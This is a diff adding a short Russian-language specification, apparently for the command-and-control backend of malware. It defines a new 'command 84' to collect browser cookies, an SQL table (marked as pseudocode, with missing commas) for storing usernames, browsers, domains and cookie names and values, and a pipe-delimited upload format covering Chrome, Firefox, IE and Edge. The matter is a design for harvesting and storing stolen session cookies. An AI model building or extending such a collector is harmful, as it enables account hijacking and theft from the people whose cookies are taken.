@@ -1,0 +1,34 @@
+1. Создать новую команду для получения данных куки. Например, код команды 84
+
+2. Создать таблицу для хранения данных (псевдокод SQL):
+CREATE TABLE cookies (
+  id SERIAL,
+  username VARCHAR(255),
+  browser VARCHAR(255)
+  domain VARCHAR(255)
+  cookie_name VARCHAR(255)
+  cookie_value VARCHAR(255)
+  created DATETIME,
+  expires DATETIME,
+  path VARCHAR(255)
+);
+
+3. Обеспечить прием данных в следующем формате:
+- простой текст, разделенный на строки.
+Разделитель строк - может быть как UNIX, так и DOS.
+Одна строка - одна запись.
+Разделитель полей в записи - вертикальная черта |
+Формат записи:
+
+username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n
+
+где
+
+username     - имя пользователя
+browser      - код броузера (enum = chrome|ff|ie|edge)
+domain       - домен куки
+cookie_name  - имя куки
+cookie_value - значение куки
+created      - дата-время создания, Unix time
+expires      - дата-время истечения, Unix time
+path         - путь URI
